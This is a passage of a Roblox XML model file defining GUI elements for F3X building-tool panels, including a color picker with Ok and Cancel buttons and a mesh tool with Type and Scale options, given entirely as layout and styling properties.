											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX11D0AFBAD3FC4DF4B3D3E05E16342206">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX7AC4E1709E6E4707ADE27348543454A8">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">100%</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXE314C7CAAFF24D5FA7ABDF7E31D72EA6">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>-4</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXE3D6AE343ADC46DCAF0C4688E7313A6C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">0.899999976</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Shadow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-3</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>3</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXA57675F55C404D3497F0730435408E69">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">ColorDisplay</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>180</XO>
										<YS>0</YS>
										<YO>220</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>60</XO>
										<YS>0</YS>
										<YO>103</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX10072B46067744B7A4744C101F775FE9">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.899999976</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="TextButton" referent="RBX32AF1AD4AC1C464DBECF69F90875E14E">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4294943279</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">4</token>
									<token name="FontSize">6</token>
									<bool name="Modal">false</bool>
									<string name="Name">OkButton</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>335</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>140</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text">Ok</string>
									<Color3 name="TextColor3">4294967295</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">0.850000024</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">2</int>
								</Properties>
								<Item class="Frame" referent="RBX33E5262E4F744C908E6F43D5616A4D7F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4291592485</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Bevel</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="TextButton" referent="RBX59F2C2C58E7A44C8BF1E525DD4C8121C">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4294943279</Color3>
									<float name="BackgroundTransparency">0.600000024</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">4</token>
									<token name="FontSize">6</token>
									<bool name="Modal">false</bool>
									<string name="Name">CancelButton</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>160</XO>
										<YS>0</YS>
										<YO>335</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>80</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text">Cancel</string>
									<Color3 name="TextColor3">4294967295</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">0.850000024</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">2</int>
								</Properties>
								<Item class="Frame" referent="RBXDE71ABBB9563466EA39A06AF602AD653">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4291592485</Color3>
										<float name="BackgroundTransparency">0.600000024</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Bevel</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX6A9AE0AF46884CFEB4AA90D25CBABCC4">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTMeshToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>172</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>200</XO>
									<YS>0</YS>
									<YO>55</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBX6FC2DE6CEE024DD89362E2952F3E7132">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX808FBCBB90E34F478A7DE64CD38F0CEB">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX5BE62A55A55A4286B6521CA88363186A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">MESH TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX8CE46347BE3C499EB8CE5BC57A7DCE73">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX62E1BAE4AD9047429A72C9D265F4BF37">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">TypeOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>65</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-14</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBXB73A6B0A7929486DA93840E0E54BF9D9">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Type</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXE5FD2EA2D0CE445F8D73C07782E5DD84">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">ScaleOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX0B9E17576A504937A3E44A3BC458676E">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>14</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Scale</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX084B0BE1B55D4F49B3180A39E40ECE19">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">XInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>45</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBX06E7996E95DB4B6FB70B28CD77C4A317">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
